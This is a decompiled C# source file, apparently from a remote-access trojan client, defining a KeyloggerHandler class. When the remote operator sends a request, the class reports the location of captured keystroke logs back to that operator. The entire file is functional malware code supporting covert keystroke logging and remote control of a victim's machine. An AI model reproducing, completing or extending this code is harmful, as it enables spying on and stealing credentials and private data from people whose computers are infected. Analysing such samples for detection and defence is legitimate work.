// Decompiled with JetBrains decompiler
// Type: InvokedClient.MessageHandlers.KeyloggerHandler
// Assembly: Client, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 79DD3210-3359-47C5-932E-9352F2CB8134
// Assembly location: C:\Users\ian\Downloads\Telegram Desktop\fein\client.exe

using InvokedClient.Config;
using InvokedCommon.Messages;
using InvokedCommon.Networking;


namespace InvokedClient.MessageHandlers
{
	public class KeyloggerHandler : IMessageProcessor
	{
		public bool CanExecute(IMessage message) => message is GetKeyloggerLogsDirectory;

		public bool CanExecuteFrom(ISender sender) => true;

		public void Execute(ISender sender, IMessage message)
		{
			if (!(message is GetKeyloggerLogsDirectory message1))
				return;
			this.Execute(sender, message1);
		}

		public void Execute(ISender client, GetKeyloggerLogsDirectory message)
		{
			client.Send<GetKeyloggerLogsDirectoryResponse>(new GetKeyloggerLogsDirectoryResponse()
			{
				LogsDirectory = Settings.LOGSPATH
			});
		}
	}
}